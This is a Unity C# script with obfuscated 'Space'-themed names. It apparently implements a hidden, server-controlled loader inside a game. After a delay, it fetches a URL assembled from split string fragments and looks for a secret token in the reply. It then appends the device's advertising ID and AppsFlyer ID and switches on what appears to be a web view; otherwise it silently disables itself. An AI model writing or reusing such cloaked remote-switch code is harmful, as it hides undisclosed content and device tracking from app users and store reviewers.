using System.Collections;
using System.Collections.Generic;
using _playerActiveAnalysi.SCRIPTS.Space.aData;
using AppsFlyerSDK;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Serialization;

namespace _playerActiveAnalysi.SCRIPTS.Space.bData
{
    public class SpaceResources : MonoBehaviour
    {
        [SerializeField] private SpaceConfidentiality _spaceConfidential;
        [SerializeField] private IDFAController _idfaSpaceCheck;

        [SerializeField] private StringConcatenator spaceStringCombiner;

        private bool isFirstLaunch = true;
        private NetworkReachability spaceNetworkStatus = NetworkReachability.NotReachable;

        private string spaceCoordinateX { get; set; }
        private string spaceCoordinateY;
        private int spaceCoordinateZ;


        private string spaceLabel;

        private void Awake()
        {
            HandleSpaceInstances();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            _idfaSpaceCheck.ScrutinizeIDFA();
            StartCoroutine(FetchSpaceAdvertisingID());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    HandleSpaceConnectionIssue();
                    break;
                default:
                    CheckSpaceData();
                    break;
            }
        }

        private void HandleSpaceInstances()
        {
            switch (isFirstLaunch)
            {
                case true:
                    isFirstLaunch = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private void ImportSpaceData()
        {
            _spaceConfidential.SpaceDataCordi = $"{spaceCoordinateX}?idfa={spaceTraceID}";
            _spaceConfidential.SpaceDataCordi +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("IntallData", string.Empty)}";
            _spaceConfidential.GGglooad111 = spaceCoordinateY;

            ActivateSpaceModule();
        }

        public void ActivateSpaceModule()
        {
            _spaceConfidential.hiiigh = spaceCoordinateZ;
            _spaceConfidential.gameObject.SetActive(true);
        }

        private IEnumerator FetchSpaceAdvertisingID()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            spaceTraceID = _idfaSpaceCheck.RetrieveAdvertisingID();
            yield return null;
        }

        private void CheckSpaceData()
        {
            if (PlayerPrefs.GetString("top", string.Empty) != string.Empty)
            {
                LoadSpaceData();
            }
            else
            {
                FetchSpaceDataWithDelay();
            }
        }

        private void LoadSpaceData()
        {
            spaceCoordinateX = PlayerPrefs.GetString("top", string.Empty);
            spaceCoordinateY = PlayerPrefs.GetString("top2", string.Empty);
            spaceCoordinateZ = PlayerPrefs.GetInt("top3", 0);
            ImportSpaceData();
        }

        private void FetchSpaceDataWithDelay()
        {
            Invoke(nameof(ReceiveSpaceData), 7.4f);
        }

        private void ReceiveSpaceData()
        {
            if (Application.internetReachability == spaceNetworkStatus)
            {
                HandleSpaceConnectionIssue();
            }
            else
            {
                StartCoroutine(FetchDataFromSpaceServer());
            }
        }

        private IEnumerator FetchDataFromSpaceServer()
        {
            using UnityWebRequest webRequest =
                UnityWebRequest.Get(spaceStringCombiner.ConcatenateStrings(BottomSpaceLLlli));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                HandleSpaceConnectionIssue();
            }
            else
            {
                ProcessSpaceServerResponse(webRequest);
            }
        }

        private string spaceTraceID;

        [SerializeField] private List<string> HeaderSpace;

        private void ProcessSpaceServerResponse(UnityWebRequest webRequest)
        {
            string tokenConcatenation = spaceStringCombiner.ConcatenateStrings(HeaderSpace);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("top", dataParts[0]);
                    PlayerPrefs.SetString("top2", dataParts[1]);
                    PlayerPrefs.SetInt("top3", int.Parse(dataParts[2]));

                    spaceCoordinateX = dataParts[0];
                    spaceCoordinateY = dataParts[1];
                    spaceCoordinateZ = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("top", webRequest.downloadHandler.text);
                    spaceCoordinateX = webRequest.downloadHandler.text;
                }

                ImportSpaceData();
            }
            else
            {
                HandleSpaceConnectionIssue();
            }
        }

        [SerializeField] private List<string> BottomSpaceLLlli;

        private void HandleSpaceConnectionIssue()
        {
            print("NO_DATA");
            DisableSpaceCanvas();
        }

        private void DisableSpaceCanvas()
        {
            UIManager.CompleteSequence(gameObject, false);
        }
    }
}